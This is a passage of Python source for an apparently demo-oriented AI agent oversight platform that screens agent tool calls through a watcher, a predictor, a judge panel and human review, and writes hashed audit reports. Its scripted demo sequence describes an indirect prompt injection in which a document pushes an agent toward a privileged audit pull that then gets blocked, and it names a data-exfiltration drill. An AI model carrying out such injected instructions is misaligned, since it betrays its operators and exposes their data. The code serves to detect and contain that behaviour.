from __future__ import annotations

import asyncio
import hashlib
import json
from datetime import UTC, datetime
from pathlib import Path
from typing import AsyncIterator

from prometheus.core.config import Settings
from prometheus.models.domain import (
    AgentRecord,
    AuditBundleResponse,
    AuditReportArchiveItem,
    AuditReportExport,
    AuditReportRequest,
    AuditReportResponse,
    DashboardSnapshot,
    DocumentInspectRequest,
    DocumentInspectResponse,
    EventRecord,
    GatewayPermissionMatrix,
    IncidentCommandCenter,
    IncidentDetailResponse,
    IncidentSummary,
    IntegrationStatus,
    LobsterTrapDebugResponse,
    LobsterTrapInspectRequest,
    LobsterTrapInspectResponse,
    PermissionEvaluation,
    PolicyPackSelectRequest,
    PolicyPackSelectResponse,
    Prediction,
    RedTeamRunResponse,
    ReviewQueueActionRequest,
    ReviewQueueActionResponse,
    ReviewQueueItem,
    Scenario,
    ScenarioRunRequest,
    ThreatIntelAuditRecord,
    ThreatIntelInput,
    ThreatIntelRunResult,
    ThreatIntelRunSummary,
    ToolCallDecision,
    ToolCallRequest,
    TribunalDecision,
    TribunalEvaluateRequest,
    WatcherInspection,
)
from prometheus.repositories.database import DatabaseManager
from prometheus.repositories.events import EventsRepository
from prometheus.repositories.gateway import GatewayRepository
from prometheus.repositories.incidents import IncidentsRepository
from prometheus.repositories.reports import ReportsRepository
from prometheus.repositories.threat_intel import ThreatIntelRepository
from prometheus.services.gemini_router import GeminiRouter
from prometheus.services.historian import HistorianService
from prometheus.services.lobstertrap_bridge import LobsterTrapBridge
from prometheus.services.permission_engine import PermissionEngine
from prometheus.services.prophet import ProphetService
from prometheus.services.sandbox_tools import SandboxToolsService
from prometheus.services.seeder import (
    build_active_incident,
    build_enterprise_metrics,
    build_knowledge_graph,
    build_review_queue,
    build_seed_snapshot,
    decision_label,
    load_scenarios,
    policy_pack_map,
)
from prometheus.services.tool_gateway import GatewayExecution, ToolGatewayService
from prometheus.services.threat_intel import ThreatIntelService
from prometheus.services.tribunal import TribunalService
from prometheus.services.trust_engine import TrustEngine
from prometheus.services.watcher import WatcherService


class PrometheusRuntime:
    def __init__(self, settings: Settings) -> None:
        self.settings = settings
        self.data_dir = Path(__file__).resolve().parent.parent / "data"
        self.runtime_file = self.data_dir / "runtime_state.json"
        self._lock = asyncio.Lock()
        self._subscribers: set[asyncio.Queue[str]] = set()
        self._sequence_task: asyncio.Task[None] | None = None

        self.router = GeminiRouter(settings)
        self.database = DatabaseManager(settings)
        self.events_repo = EventsRepository(self.database)
        self.gateway_repo = GatewayRepository(self.database)
        self.incidents_repo = IncidentsRepository(self.database)
        self.reports_repo = ReportsRepository(self.database)
        self.threat_intel_repo = ThreatIntelRepository(self.database)
        self.bridge = LobsterTrapBridge(settings)
        self.watcher = WatcherService(self.bridge)
        self.prophet = ProphetService(self.router)
        self.tribunal = TribunalService(self.router)
        self.historian = HistorianService(self.router)
        self.trust_engine = TrustEngine()
        self.sandbox_tools = SandboxToolsService(self.database)
        self.permission_engine = PermissionEngine(self.sandbox_tools)
        self.tool_gateway = ToolGatewayService(
            watcher=self.watcher,
            prophet=self.prophet,
            tribunal=self.tribunal,
            permission_engine=self.permission_engine,
            sandbox_tools=self.sandbox_tools,
        )
        self.threat_intel = ThreatIntelService(self.router)
        self.policy_packs = policy_pack_map()
        self.scenarios: dict[str, Scenario] = {scenario.id: scenario for scenario in load_scenarios()}

    async def initialize(self) -> None:
        self.database.initialize()
        await self.router.probe()

        if self.database.available:
            snapshot = self.database.load_runtime_state()
            if snapshot is None:
                await self.reset()
                return
            await self._store_snapshot(snapshot, broadcast=False)
            return

        if not self.runtime_file.exists():
            await self.reset()
            return
        try:
            self._load_snapshot()
        except Exception:
            await self.reset()

    async def reset(self) -> DashboardSnapshot:
        snapshot = self._normalize_snapshot(build_seed_snapshot(self.settings))
        if self.database.available:
            self.database.clear_all()
        await self._store_snapshot(snapshot)
        return snapshot

    async def snapshot(self) -> DashboardSnapshot:
        return self._load_snapshot()

    async def integrations_status(self) -> IntegrationStatus:
        snapshot = self._load_snapshot()
        return self._integration_status(snapshot.active_policy_pack)

    async def list_incidents(self) -> list[IncidentSummary]:
        if self.database.available:
            return self.incidents_repo.list_incidents()
        snapshot = self._load_snapshot()
        return [
            IncidentSummary(
                incident_id=event.id,
                title=event.title,
                agent_id=event.agent_id,
                severity=event.severity,
                decision=event.decision,
                decision_label=event.decision_label,
                policy_pack=event.policy_pack,
                risk_score=event.risk_score,
                timestamp=event.timestamp,
            )
            for event in snapshot.events
        ]

    async def incident_detail(self, incident_id: str) -> IncidentDetailResponse:
        snapshot = self._load_snapshot()
        event = next((item for item in snapshot.events if item.id == incident_id), None)
        if event is None and self.database.available:
            event = self.events_repo.get_event(incident_id)
        if event is None:
            raise KeyError(f"Unknown incident: {incident_id}")

        incident = self.incidents_repo.get_incident(incident_id) if self.database.available else None
        if incident is None:
            incident = self.historian.build_incident(event)

        reports = self.reports_repo.reports_for_incident(incident_id) if self.database.available else []
        return IncidentDetailResponse(incident=incident, event=event, reports=reports)

    async def list_reports(self) -> list[AuditReportArchiveItem]:
        if self.database.available:
            return self.reports_repo.list_reports()
        return []

    async def inspect_prompt(
        self,
        request: LobsterTrapInspectRequest,
    ) -> LobsterTrapInspectResponse:
        inspection = self.watcher.inspect(
            user_prompt=request.prompt,
            declared_intent=request.declared_intent,
            agent_id=request.agent_id,
            policy_pack=request.policy_pack,
            risk_score=0.74
            if (request.detected_intent or request.declared_intent) != request.declared_intent
            else 0.28,
            detected_intent=request.detected_intent,
        )
        return LobsterTrapInspectResponse(
            agent_id=request.agent_id,
            inspection=inspection,
            status_label=self.bridge.status_label,
            policy_rule_count=self.bridge.policy_rule_count,
            policy_rules_count=self.bridge.policy_rule_count,
        )

    async def lobstertrap_debug(self) -> LobsterTrapDebugResponse:
        return self.bridge.debug_info()

    async def gateway_permissions(self) -> GatewayPermissionMatrix:
        snapshot = self._load_snapshot()
        return self.tool_gateway.permission_matrix(snapshot.agents)

    async def list_tool_calls(self) -> list[ToolCallDecision]:
        if self.database.available:
            return self.gateway_repo.list_tool_calls()
        return self._load_snapshot().recent_tool_calls

    async def get_tool_call(self, request_id: str) -> ToolCallDecision:
        if self.database.available:
            decision = self.gateway_repo.get_tool_call(request_id)
            if decision is not None:
                return decision
        for decision in self._load_snapshot().recent_tool_calls:
            if decision.request_id == request_id:
                return decision
        raise KeyError(f"Unknown tool call request: {request_id}")

    async def execute_tool_call(
        self,
        request: ToolCallRequest,
        *,
        status_message: str | None = None,
        scenario_context: Scenario | None = None,
    ) -> ToolCallDecision:
        snapshot = self._load_snapshot()
        execution = await self.tool_gateway.enforce(
            request=request,
            agent=self._find_agent(request.agent_id, snapshot.agents),
            scenario_context=scenario_context,
        )
        event = await self._commit_gateway_execution(
            snapshot=snapshot,
            execution=execution,
            status_message=status_message
            or f"Agent Tool Gateway intercepted {request.tool_name} for {request.agent_id}.",
        )
        final_decision = execution.decision.model_copy(update={"source_event_id": event.id})
        self._persist_gateway_records(
            request=request,
            evaluation=execution.permission_evaluation,
            decision=final_decision,
        )
        return final_decision

    async def replay_tool_call(self, request_id: str) -> ToolCallDecision:
        stored_request = self.gateway_repo.get_tool_call_request(request_id) if self.database.available else None
        if stored_request is None:
            raise KeyError(f"Unknown tool call request: {request_id}")
        snapshot = self._load_snapshot()
        replay_request = stored_request.model_copy(
            update={"policy_pack": snapshot.active_policy_pack}
        )
        return await self.execute_tool_call(
            replay_request,
            status_message=(
                f"Replayed {replay_request.tool_name} through the current {snapshot.active_policy_pack} policy pack."
            ),
        )

    async def inspect_document(self, request: DocumentInspectRequest) -> DocumentInspectResponse:
        prompt = (
            f"{request.declared_intent}\n\n"
            f"Document name: {request.document_name}\n"
            f"Document content:\n{request.document_content}"
        )
        tool_request = ToolCallRequest(
            agent_id=request.agent_id,
            tool_name=request.tool_name,
            declared_intent=request.declared_intent,
            prompt=prompt,
            payload={
                "document_name": request.document_name,
                "content": request.document_content,
                "destination": "document-attack-lab",
            },
            policy_pack=request.policy_pack,
            requires_human_review=request.requires_human_review,
        )
        decision = await self.execute_tool_call(
            tool_request,
            status_message=(
                f"Document Attack Lab inspected {request.document_name} through {request.tool_name}."
            ),
        )
        response = DocumentInspectResponse(
            document_name=request.document_name,
            content_excerpt=request.document_content[:220],
            document_content_preview=request.document_content[:320],
            evidence_preview=decision.reason[:320],
            tool_decision=decision,
            incident_id=decision.source_event_id,
            audit_hash=decision.audit_hash,
        )
        if self.database.available:
            self.gateway_repo.store_document_inspection(response)
        if decision.source_event_id is not None:
            await self.build_audit_bundle(
                AuditReportRequest(incident_id=decision.source_event_id),
                persist=True,
            )
        return response

    async def analyze_threat_intel(self, request: ThreatIntelInput) -> ThreatIntelRunResult:
        result = await self.threat_intel.analyze_threat_report(
            request,
            execute_tool_call=self._execute_threat_intel_tool_call,
            build_audit_record=self._build_threat_intel_audit_record,
        )
        if self.database.available:
            self.threat_intel_repo.store_run(result)
            if result.gateway_decision is not None:
                self.events_repo.record_scenario_run(
                    scenario_id=f"threat_intel_{result.run_id}",
                    incident_id=result.gateway_decision.source_event_id or result.run_id,
                    mode="threat_intel",
                    data={
                        "title": result.title,
                        "tool_name": result.generated_scenario.attempted_tool
                        if result.generated_scenario is not None
                        else None,
                        "decision": result.gateway_decision.decision,
                    },
                )
        return result

    async def list_threat_intel_runs(self) -> list[ThreatIntelRunSummary]:
        if self.database.available:
            return self.threat_intel_repo.list_runs()
        return []

    async def get_threat_intel_run(self, run_id: str) -> ThreatIntelRunResult:
        if self.database.available:
            run = self.threat_intel_repo.get_run(run_id)
            if run is not None:
                return run
        raise KeyError(f"Unknown threat intel run: {run_id}")

    async def subscribe(self) -> asyncio.Queue[str]:
        queue: asyncio.Queue[str] = asyncio.Queue()
        self._subscribers.add(queue)
        await queue.put(self._serialize_snapshot(self._load_snapshot()))
        return queue

    def unsubscribe(self, queue: asyncio.Queue[str]) -> None:
        self._subscribers.discard(queue)

    async def ping_stream(self) -> AsyncIterator[str]:
        queue = await self.subscribe()
        try:
            while True:
                try:
                    payload = await asyncio.wait_for(queue.get(), timeout=15)
                    yield f"event: snapshot\ndata: {payload}\n\n"
                except asyncio.TimeoutError:
                    yield ": keep-alive\n\n"
        finally:
            self.unsubscribe(queue)

    async def start_red_team(self, mode: str) -> RedTeamRunResponse:
        if self._sequence_task and not self._sequence_task.done():
            return RedTeamRunResponse(
                started=False,
                mode=mode,  # type: ignore[arg-type]
                message="A red team sequence is already running.",
            )

        self._sequence_task = asyncio.create_task(self._run_sequence(mode))
        return RedTeamRunResponse(
            started=True,
            mode=mode,  # type: ignore[arg-type]
            message="Red Team drill armed." if mode == "drill" else "Judge-ready demo mode engaged.",
        )

    async def evaluate_request(
        self,
        request: TribunalEvaluateRequest,
    ) -> TribunalDecision:
        scenario = Scenario(
            id=request.scenario_id,
            name=request.scenario_id.replace("_", " ").title(),
            user_prompt=request.user_prompt,
            declared_intent=request.declared_intent,
            detected_intent=request.detected_intent,
            expected_decision=request.expected_decision,
            risk_score=request.risk_score,
            policy_pack=request.policy_pack,
            explanation="On-demand tribunal evaluation request.",
            agent_id=request.agent_id,
            observed_action=request.observed_action,
            predicted_action="baseline_action",
            mitre_tactic_label="TA0000 - Manual evaluation",
            department="AI governance",
            business_impact="Analyst-initiated evaluation.",
            regulatory_impact="No direct regulatory effect until execution.",
            compliance_concern="Policy alignment review.",
            blocked_action=request.observed_action,
            recommended_remediation="Escalate if this request maps to a production workflow.",
            audit_summary="Manual tribunal evaluation recorded.",
            enterprise_value="Shows explainable risk reasoning to governance teams.",
            affected_resources=["manual-review"],
        )
        agent = self._find_agent(request.agent_id)
        inspection = self.watcher.inspect(
            user_prompt=request.user_prompt,
            declared_intent=request.declared_intent,
            agent_id=request.agent_id,
            policy_pack=request.policy_pack,
            risk_score=request.risk_score,
            detected_intent=request.detected_intent,
        )
        prediction = await self.prophet.predict(
            agent=agent,
            scenario=scenario,
            inspection=inspection,
        )
        return await self.tribunal.evaluate(
            agent=agent,
            scenario=scenario,
            inspection=inspection,
            prediction=prediction,
        )

    async def build_audit_report(
        self,
        request: AuditReportRequest,
    ) -> AuditReportResponse:
        _, event, scenario, agent, inspection, _, decision = await self._incident_context(request)
        return await self.historian.build_report(
            agent=agent,
            scenario=scenario,
            event=event,
            decision=decision,
            inspection=inspection,
        )

    async def export_audit_report(
        self,
        request: AuditReportRequest,
        *,
        format_name: str,
    ) -> AuditReportExport:
        bundle = await self.build_audit_bundle(request, persist=False)
        content = bundle.markdown_report if format_name == "markdown" else bundle.html_report
        extension = "md" if format_name == "markdown" else "html"
        slug = (request.incident_id or request.scenario_id or "incident").replace("_", "-")
        title = f"{bundle.incident_id} - Regulator Report"
        export = AuditReportExport(
            title=title,
            format=format_name,  # type: ignore[arg-type]
            content=content,
            file_name=f"prometheus-{slug}-report.{extension}",
            model_used=bundle.tribunal_votes[0].model_used if bundle.tribunal_votes else "deterministic-demo",
        )
        if self.database.available:
            self.reports_repo.store_export(
                export,
                incident_id=bundle.incident_id,
                decision=bundle.decision,
                policy_pack=bundle.policy_pack,
                audit_hash=bundle.audit_hash,
            )
        return export

    async def build_audit_bundle(
        self,
        request: AuditReportRequest,
        *,
        persist: bool = True,
    ) -> AuditBundleResponse:
        _, event, scenario, agent, inspection, _, decision = await self._incident_context(request)
        report = await self.historian.build_report(
            agent=agent,
            scenario=scenario,
            event=event,
            decision=decision,
            inspection=inspection,
        )
        canonical = {
            "incident_id": event.id,
            "tenant": self.settings.tenant_label,
            "policy_pack": event.policy_pack,
            "decision": event.decision_label,
            "risk_score": event.risk_score,
            "evidence": event.evidence.model_dump(mode="json", by_alias=True),
            "timeline": report.timeline,
            "tribunal_votes": [vote.model_dump(mode="json", by_alias=True) for vote in decision.judges],
            "remediation": event.impact.recommended_remediation,
        }
        audit_hash = hashlib.sha256(
            json.dumps(canonical, sort_keys=True, separators=(",", ":")).encode("utf-8")
        ).hexdigest()
        bundle = AuditBundleResponse(
            incident_id=event.id,
            tenant=self.settings.tenant_label,
            policy_pack=event.policy_pack,
            decision=event.decision_label,
            risk_score=event.risk_score,
            evidence=event.evidence,
            timeline=report.timeline,
            tribunal_votes=decision.judges,
            remediation=event.impact.recommended_remediation,
            markdown_report=report.markdown,
            html_report=report.html,
            audit_hash=audit_hash,
            tamper_notice="Tamper-evident audit hash generated from canonical incident evidence.",
        )
        if persist and self.database.available:
            self.reports_repo.store_bundle(bundle, model_used=report.model_used)
        return bundle

    async def list_scenarios(self) -> list[Scenario]:
        return list(self.scenarios.values())

    async def run_scenario(self, scenario_id: str | ScenarioRunRequest) -> DashboardSnapshot:
        resolved_id = scenario_id.scenario_id if isinstance(scenario_id, ScenarioRunRequest) else scenario_id
        scenario = self.scenarios.get(resolved_id)
        if scenario is None:
            raise KeyError(f"Unknown scenario: {resolved_id}")

        tool_request = self._tool_call_request_for_scenario(scenario)
        decision = await self.execute_tool_call(
            tool_request,
            status_message=f"Scenario Lab executed {scenario.name}.",
            scenario_context=scenario,
        )
        if self.database.available:
            self.events_repo.record_scenario_run(
                scenario_id=scenario.id,
                incident_id=decision.source_event_id or scenario.id,
                mode="scenario_lab",
                data={"name": scenario.name, "decision": decision.decision, "tool_name": tool_request.tool_name},
            )
        return self._load_snapshot()

    async def select_policy_pack(
        self,
        request: PolicyPackSelectRequest,
    ) -> PolicyPackSelectResponse:
        if request.policy_pack_id not in self.policy_packs:
            raise KeyError(f"Unknown policy pack: {request.policy_pack_id}")

        await self._mutate_snapshot(
            lambda snapshot: snapshot.model_copy(
                update={
                    "active_policy_pack": request.policy_pack_id,
                    "integration_status": self._integration_status(request.policy_pack_id),
                    "status_message": (
                        f"Policy pack switched to {self.policy_packs[request.policy_pack_id].label}. "
                        "Decision thresholds and labels updated."
                    ),
                    "last_updated": datetime.now(UTC).isoformat(),
                }
            )
        )
        return PolicyPackSelectResponse(active_policy_pack=request.policy_pack_id)

    async def apply_review_action(
        self,
        request: ReviewQueueActionRequest,
    ) -> ReviewQueueActionResponse:
        snapshot = self._load_snapshot()
        source_event = next((event for event in snapshot.events if event.id == request.event_id), None)
        if source_event is None:
            raise KeyError(f"Unknown event: {request.event_id}")

        review_message = {
            "approved": "Human review approved the action path.",
            "denied": "Human review denied the action and preserved the block.",
            "quarantined": "Human review escalated the incident into quarantine.",
            "escalated": "Human review escalated the incident to governance leadership.",
            "pending": "Human review returned the incident to pending state.",
        }[request.action]

        def mutate(snapshot: DashboardSnapshot) -> DashboardSnapshot:
            updated_events: list[EventRecord] = []
            for event in snapshot.events:
                if event.id == request.event_id:
                    updated_events.append(event.model_copy(update={"review_status": request.action}))
                else:
                    updated_events.append(event)

            updated_queue: list[ReviewQueueItem] = []
            for item in snapshot.review_queue:
                if item.event_id == request.event_id:
                    updated_queue.append(item.model_copy(update={"status": request.action}))
                else:
                    updated_queue.append(item)

            audit_event = self._build_review_audit_event(
                source_event=source_event,
                action=request.action,
                message=review_message,
                active_policy_pack=snapshot.active_policy_pack,
            )
            updated_events = [audit_event, *updated_events][:18]
            active_incident = build_active_incident(updated_events)
            kpis = self.trust_engine.rebuild_kpis(agents=snapshot.agents, events=updated_events)
            return snapshot.model_copy(
                update={
                    "events": updated_events,
                    "review_queue": updated_queue,
                    "active_incident": active_incident,
                    "kpis": kpis,
                    "knowledge_graph": build_knowledge_graph(snapshot.agents, updated_events),
                    "enterprise_metrics": build_enterprise_metrics(kpis),
                    "status_message": review_message,
                    "last_updated": datetime.now(UTC).isoformat(),
                }
            )

        await self._mutate_snapshot(mutate)
        if self.database.available:
            self.incidents_repo.record_human_review(
                event_id=request.event_id,
                incident_id=source_event.id,
                action=request.action,
                message=review_message,
                data={"source_event": source_event.id, "status": request.action},
            )

        return ReviewQueueActionResponse(
            event_id=request.event_id,
            status=request.action,
            message=review_message,
        )

    async def _run_sequence(self, mode: str) -> None:
        if mode == "demo":
            await self._run_demo_script()
            return
        scenario = self.scenarios["data_exfiltration"]
        await self._run_drill_sequence(scenario)

    async def _run_drill_sequence(self, scenario: Scenario) -> None:
        await self._mutate_snapshot(
            lambda snapshot: snapshot.model_copy(
                update={
                    "demo_running": True,
                    "demo_mode": False,
                    "countdown_seconds": 14,
                    "demo_stage": "Red Team drill",
                    "demo_progress_percent": 0,
                    "report_ready": False,
                    "status_message": "Red Team drill armed. Watcher is locking onto agent intent.",
                    "active_tribunal": None,
                }
            )
        )
        await asyncio.sleep(1)
        await self._execute_scenario(
            scenario,
            status_prefix=scenario.name,
            decision_override_label=None,
            countdown_seed=14,
        )
        await self._mutate_snapshot(
            lambda snapshot: snapshot.model_copy(
                update={
                    "demo_running": False,
                    "countdown_seconds": 0,
                    "demo_stage": "Red Team drill complete",
                    "demo_progress_percent": 100,
                    "report_ready": True,
                    "status_message": "Red Team drill complete. Historian sealed the incident narrative.",
                }
            )
        )

    async def _run_demo_script(self) -> None:
        scenario = self.scenarios["indirect_prompt_injection"]
        await self._mutate_snapshot(
            lambda snapshot: snapshot.model_copy(
                update={
                    "demo_running": True,
                    "demo_mode": True,
                    "countdown_seconds": self.settings.default_demo_duration_seconds,
                    "demo_stage": "0-10s: Normal operations",
                    "demo_progress_percent": 0,
                    "report_ready": False,
                    "active_tribunal": None,
                    "status_message": "Normal operations. Trust scores stable across the fleet.",
                }
            )
        )
        await asyncio.sleep(10)

        await self._mutate_snapshot(
            lambda snapshot: self._with_agent_update(
                snapshot,
                scenario.agent_id,
                {
                    "status": "watching",
                    "last_action": "document instruction entered the ingest path",
                    "last_event_at": "just now",
                    "predicted_action": scenario.predicted_action,
                },
                status_message=(
                    "10-25s: Indirect prompt injection enters through document content."
                ),
                countdown_seconds=80,
                demo_stage="10-25s: Document-borne attack enters",
                demo_progress_percent=20,
            )
        )
        await asyncio.sleep(15)

        await self._mutate_snapshot(
            lambda snapshot: snapshot.model_copy(
                update={
                    "status_message": (
                        "25-40s: Watcher flags suspicious instruction. "
                        "Lobster Trap-style DPI extracts the intent mismatch."
                    ),
                    "demo_stage": "25-40s: Watcher flags intent mismatch",
                    "countdown_seconds": 65,
                    "demo_progress_percent": 40,
                    "last_updated": datetime.now(UTC).isoformat(),
                }
            )
        )
        await asyncio.sleep(15)

        await self._mutate_snapshot(
            lambda snapshot: self._with_agent_update(
                snapshot,
                scenario.agent_id,
                {
                    "status": "watching",
                    "last_action": "observed privileged_audit_pull",
                    "predicted_action": "chunk.index",
                    "divergence_score": 0.91,
                },
                status_message=(
                    "40-55s: Prophet expects document indexing only, "
                    "but observed behavior attempts a privileged audit pull."
                ),
                countdown_seconds=50,
                demo_stage="40-55s: Prophet detects divergence",
                demo_progress_percent=60,
            )
        )
        await asyncio.sleep(15)

        await self._execute_scenario(
            scenario,
            status_prefix="55-70s: Tribunal opens",
            decision_override_label="QUARANTINE + BLOCK TOOL CALL",
            countdown_seed=35,
            stage="55-70s: Tribunal voting",
            progress=78,
            persist_demo_state=True,
        )

        await self._mutate_snapshot(
            lambda snapshot: snapshot.model_copy(
                update={
                    "countdown_seconds": 20,
                    "demo_stage": "70-80s: Quarantine sealed",
                    "demo_progress_percent": 88,
                    "status_message": "70-80s: Final decision QUARANTINE + BLOCK TOOL CALL.",
                    "report_ready": False,
                    "last_updated": datetime.now(UTC).isoformat(),
                }
            )
        )
        await asyncio.sleep(10)

        await self._mutate_snapshot(
            lambda snapshot: snapshot.model_copy(
                update={
                    "countdown_seconds": 10,
                    "demo_stage": "80-90s: Historian seals the report",
                    "demo_progress_percent": 96,
                    "report_ready": True,
                    "status_message": (
                        "80-90s: Historian sealed the audit narrative. "
                        "Generate Regulator Report is now ready."
                    ),
                    "last_updated": datetime.now(UTC).isoformat(),
                }
            )
        )
        await asyncio.sleep(10)

        await self._mutate_snapshot(
            lambda snapshot: snapshot.model_copy(
                update={
                    "demo_running": False,
                    "demo_mode": False,
                    "countdown_seconds": 0,
                    "demo_stage": "Demo complete",
                    "demo_progress_percent": 100,
                    "status_message": (
                        "Judge demo complete. Prometheus showed detection, decision, and audit value."
                    ),
                    "last_updated": datetime.now(UTC).isoformat(),
                }
            )
        )

    async def _execute_scenario(
        self,
        scenario: Scenario,
        *,
        status_prefix: str,
        decision_override_label: str | None,
        countdown_seed: int,
        stage: str | None = None,
        progress: int | None = None,
        persist_demo_state: bool = False,
    ) -> None:
        agent = self._find_agent(scenario.agent_id)
        tool_request = self._tool_call_request_for_scenario(scenario)

        await self._mutate_snapshot(
            lambda snapshot: self._with_agent_update(
                snapshot,
                agent.id,
                {
                    "status": "watching",
                    "last_action": f"attack start - {scenario.detected_intent}",
                    "last_event_at": "just now",
                    "predicted_action": scenario.predicted_action,
                },
                status_message=f"{status_prefix}: Watcher inspecting DPI metadata.",
                countdown_seconds=countdown_seed,
                demo_stage=stage or snapshot.demo_stage,
                demo_progress_percent=progress or snapshot.demo_progress_percent,
            )
        )
        await asyncio.sleep(2)

        execution = await self.tool_gateway.enforce(
            request=tool_request,
            agent=self._find_agent(agent.id),
            scenario_context=scenario,
        )
        event_decision = self._event_decision_from_gateway(execution)

        await self._mutate_snapshot(
            lambda snapshot: self._with_agent_update(
                snapshot,
                agent.id,
                {
                    "status": "watching",
                    "predicted_action": execution.prediction.predicted_action,
                    "divergence_score": execution.prediction.divergence_score,
                    "last_action": f"prophet predicted - {execution.prediction.predicted_action}",
                },
                status_message=f"{status_prefix}: Prophet predicts {execution.prediction.predicted_action}.",
                countdown_seconds=max(countdown_seed - 5, 0),
                demo_stage=stage or snapshot.demo_stage,
                demo_progress_percent=progress or snapshot.demo_progress_percent,
            )
        )
        await asyncio.sleep(2)

        await self._mutate_snapshot(
            lambda snapshot: snapshot.model_copy(
                update={
                    "active_tribunal": event_decision,
                    "status_message": f"{status_prefix}: Tribunal convened. Three judges are voting.",
                    "countdown_seconds": max(countdown_seed - 10, 0),
                    "demo_stage": stage or snapshot.demo_stage,
                    "demo_progress_percent": progress or snapshot.demo_progress_percent,
                    "last_updated": datetime.now(UTC).isoformat(),
                }
            )
        )
        await asyncio.sleep(4)

        snapshot = self._load_snapshot()
        event = await self._commit_gateway_execution(
            snapshot=snapshot,
            execution=execution,
            status_message=(
                f"{status_prefix}: Final decision "
                f"{decision_override_label or execution.decision.decision}. KPI counters updated."
            ),
            decision_override_label=decision_override_label,
            active_tribunal=event_decision,
            countdown_seconds=max(countdown_seed - 15, 0),
            demo_stage=stage or snapshot.demo_stage,
            demo_progress_percent=progress or snapshot.demo_progress_percent,
            report_ready=not persist_demo_state,
        )
        self._persist_gateway_records(
            request=tool_request,
            evaluation=execution.permission_evaluation,
            decision=execution.decision.model_copy(update={"source_event_id": event.id}),
        )
        if self.database.available:
            self.events_repo.record_scenario_run(
                scenario_id=scenario.id,
                incident_id=event.id,
                mode="demo" if persist_demo_state else "drill",
                data={"name": scenario.name, "decision": execution.decision.decision, "tool_name": tool_request.tool_name},
            )

    async def _commit_gateway_execution(
        self,
        *,
        snapshot: DashboardSnapshot,
        execution: GatewayExecution,
        status_message: str,
        decision_override_label: str | None = None,
        active_tribunal: TribunalDecision | None = None,
        countdown_seconds: int | None = None,
        demo_stage: str | None = None,
        demo_progress_percent: int | None = None,
        report_ready: bool | None = None,
    ) -> EventRecord:
        event_decision = self._event_decision_from_gateway(execution)
        updated_agent = self.trust_engine.apply_decision(
            agent=self._find_agent(execution.request.agent_id, snapshot.agents),
            prediction=execution.prediction,
            decision=event_decision.consensus,
        ).model_copy(
            update={
                "last_action": execution.request.tool_name,
                "last_event_at": "just now",
                "predicted_action": execution.prediction.predicted_action,
                "model_source": "gemini" if self.router.available else "deterministic",
            }
        )
        event = self.historian.build_event(
            scenario=execution.scenario,
            prediction=execution.prediction,
            decision=event_decision,
            inspection=execution.inspection,
            trust_delta=updated_agent.trust_delta,
        ).model_copy(
            update={
                "observed_action": execution.request.tool_name,
                "predicted_action": execution.prediction.predicted_action,
                "explanation": execution.decision.reason,
                "decision_label": decision_override_label
                or self._tool_call_label(execution.decision.decision, execution.request.policy_pack),
                "review_status": (
                    "approved"
                    if execution.decision.decision == "ALLOW"
                    else "pending"
                ),
            }
        )
        timeline = list(event.evidence.timeline)
        timeline.append(
            execution.tool_result.side_effect_summary
            if execution.tool_result is not None
            else execution.decision.side_effect_prevented or "Tool execution prevented."
        )
        event = event.model_copy(
            update={
                "evidence": event.evidence.model_copy(
                    update={
                        "timeline": timeline,
                        "recommended_action": execution.decision.reason,
                    }
                )
            }
        )
        incident = self.historian.build_incident(event)
        tool_decision_record = execution.decision.model_copy(update={"source_event_id": event.id})

        async def commit(current: DashboardSnapshot) -> DashboardSnapshot:
            agents = [
                updated_agent if existing.id == updated_agent.id else existing
                for existing in current.agents
            ]
            events = [event, *current.events][:18]
            kpis = self.trust_engine.roll_kpis(
                current=current.kpis,
                agents=agents,
                decision=event_decision.consensus,
                latency_ms=event_decision.latency_ms,
            )
            recent_tool_calls = [tool_decision_record, *current.recent_tool_calls]
            deduped_tool_calls: list[ToolCallDecision] = []
            seen_request_ids: set[str] = set()
            for item in recent_tool_calls:
                if item.request_id in seen_request_ids:
                    continue
                deduped_tool_calls.append(item)
                seen_request_ids.add(item.request_id)
                if len(deduped_tool_calls) >= 12:
                    break
            return current.model_copy(
                update={
                    "agents": agents,
                    "events": events,
                    "kpis": kpis,
                    "knowledge_graph": build_knowledge_graph(agents, events),
                    "review_queue": build_review_queue(events),
                    "active_incident": incident,
                    "enterprise_metrics": build_enterprise_metrics(kpis),
                    "integration_status": self._integration_status(current.active_policy_pack),
                    "active_tribunal": active_tribunal,
                    "status_message": status_message,
                    "countdown_seconds": countdown_seconds
                    if countdown_seconds is not None
                    else current.countdown_seconds,
                    "demo_stage": demo_stage or current.demo_stage,
                    "demo_progress_percent": demo_progress_percent
                    if demo_progress_percent is not None
                    else current.demo_progress_percent,
                    "report_ready": report_ready if report_ready is not None else current.report_ready,
                    "last_tool_call": tool_decision_record,
                    "recent_tool_calls": deduped_tool_calls,
                }
            )

        await self._mutate_snapshot(commit)
        return event

    def _event_decision_from_gateway(self, execution: GatewayExecution) -> TribunalDecision:
        if execution.decision.decision == "ALLOW":
            consensus = "ALLOW"
        elif execution.decision.decision == "BLOCK":
            consensus = "BLOCK"
        else:
            consensus = "QUARANTINE"
        if execution.tribunal_decision is not None:
            return execution.tribunal_decision.model_copy(update={"consensus": consensus})
        return TribunalDecision(
            scenario_id=execution.scenario.id,
            agent_id=execution.request.agent_id,
            consensus=consensus,  # type: ignore[arg-type]
            latency_ms=204,
            explanation=execution.decision.reason,
            model_used=execution.prediction.model_used,
            judges=execution.decision.tribunal_votes,
        )

    def _tool_call_label(self, decision: str, policy_pack: str) -> str:
        if decision == "HUMAN_REVIEW":
            return "HUMAN REVIEW REQUIRED"
        mapped = "QUARANTINE" if decision == "QUARANTINE" else "BLOCK" if decision == "BLOCK" else "ALLOW"
        return decision_label(mapped, policy_pack)

    def _persist_gateway_records(
        self,
        *,
        request: ToolCallRequest,
        evaluation: PermissionEvaluation,
        decision: ToolCallDecision,
    ) -> None:
        if not self.database.available:
            return
        self.gateway_repo.store_tool_call_request(decision.request_id, request)
        self.gateway_repo.store_permission_evaluation(decision.request_id, evaluation)
        self.gateway_repo.store_decision(decision)

    async def _execute_threat_intel_tool_call(
        self,
        request: ToolCallRequest,
    ) -> ToolCallDecision:
        return await self.execute_tool_call(
            request,
            status_message=(
                f"Zero-Day Sentinel simulated {request.tool_name} for the Security Research Agent."
            ),
        )

    async def _build_threat_intel_audit_record(
        self,
        decision: ToolCallDecision,
    ) -> ThreatIntelAuditRecord | None:
        return ThreatIntelAuditRecord(
            incident_id=decision.source_event_id or decision.request_id,
            decision=decision.decision,
            policy_pack=decision.permission_evaluation.policy_pack,
            audit_hash=decision.audit_hash,
